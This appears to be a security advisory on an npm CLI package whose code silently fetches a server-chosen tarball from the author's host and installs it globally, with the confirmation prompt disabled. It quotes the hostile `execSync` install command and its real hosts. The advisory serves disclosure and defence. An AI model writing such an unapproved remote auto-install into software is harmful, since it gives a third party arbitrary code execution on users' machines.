summary: Silent auto-update fetches and installs unpinned tarball from author-controlled host on every CLI invocation
details: On every invocation of the package's CLI commands (jcc/jcx/ucx/jgrok/jcodex/jclaude), lib/claude_cli_common.js calls fetchConfig against https://jai.jaskle.cn/hm/hm_pub/ai_cc_cfg to obtain a `newVer` string, then runs `execSync('npm install -g https://jdwfiles.oss-cn-hangzhou.aliyuncs.com/npm_pkg/base_parts_ai-<newVer>.tgz --force --registry=https://registry.npmmirror.com')`. The destination is an Aliyun OSS bucket controlled by the author, not the npm registry on which the package is published; the tarball URL is unpinned (the version is chosen by the server at jai.jaskle.cn at request time), there is no hash or signature check, and `--force` replaces the user's globally installed package. The interactive confirmation prompt that would normally gate this update is commented out and replaced with a hardcoded `confirmed = "yes"`, so the update runs with no user approval. Whoever controls jai.jaskle.cn or the OSS bucket can direct every CLI invocation to install arbitrary code globally on the user's machine. A separate telemetry endpoint at https://jai.jaskle.cn/hm/pub/ai_tip transmits CLI name, OS, and architecture (no credentials or filesystem contents).

cwes.description: The product contains code that appears to be malicious in nature.
